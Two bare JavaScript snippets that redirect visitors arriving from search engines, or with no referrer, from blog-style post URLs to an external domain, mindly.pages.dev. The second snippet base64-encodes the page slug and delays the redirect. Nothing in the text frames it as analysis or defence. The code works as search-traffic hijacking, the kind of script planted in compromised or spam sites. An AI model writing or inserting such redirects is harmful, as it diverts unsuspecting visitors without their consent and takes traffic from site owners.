// Script A
(function() {
  const searchEnginesA = ['google.', 'bing.', 'yahoo.', 'duckduckgo.', 'baidu.'];

  function isFromSearchEngineA(referrer) {
    return searchEnginesA.some(engine => referrer.includes(engine));
  }

  function extractSlugA(url) {
    const match = url.match(/\/\d{4}\/\d{2}\/(.+)\.html/);
    return match ? decodeURIComponent(match[1]).replace(/-/g, ' ') : null;
  }

  function performRedirectA(slug) {
    window.location.href = `https://mindly.pages.dev/${encodeURIComponent(slug)}`;
  }

  function attemptRedirectA() {
    const currentUrl = window.location.href;
    const referrer = document.referrer.toLowerCase();
    const slug = extractSlugA(currentUrl);

    if (slug && (isFromSearchEngineA(referrer) || referrer === '' || new URLSearchParams(window.location.search).has('q'))) {
      performRedirectA(slug);
    }
  }

  attemptRedirectA();
})();

// Script B
(function() {
  const searchEnginesB = ['yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.'];

  function isFromSearchEngineB(referrer) {
    return searchEnginesB.some(engine => referrer.includes(engine));
  }

  function extractSlugB(url) {
    const parts = url.split('/');
    const lastPart = parts[parts.length - 1];
    return lastPart.endsWith('.html') ? lastPart.slice(0, -5).replace(/-/g, ' ') : null;
  }

  function performRedirectB(slug) {
    const encodedSlug = btoa(encodeURIComponent(slug)).replace(/=/g, '');
    window.location.href = `https://mindly.pages.dev/r/${encodedSlug}`;
  }

  function attemptRedirectB() {
    const currentUrl = window.location.href;
    const referrer = document.referrer.toLowerCase();
    const slug = extractSlugB(currentUrl);

    if (slug && (isFromSearchEngineB(referrer) || referrer === '' || new URLSearchParams(window.location.search).has('query'))) {
      performRedirectB(slug);
    }
  }

  setTimeout(attemptRedirectB, 100);
})();
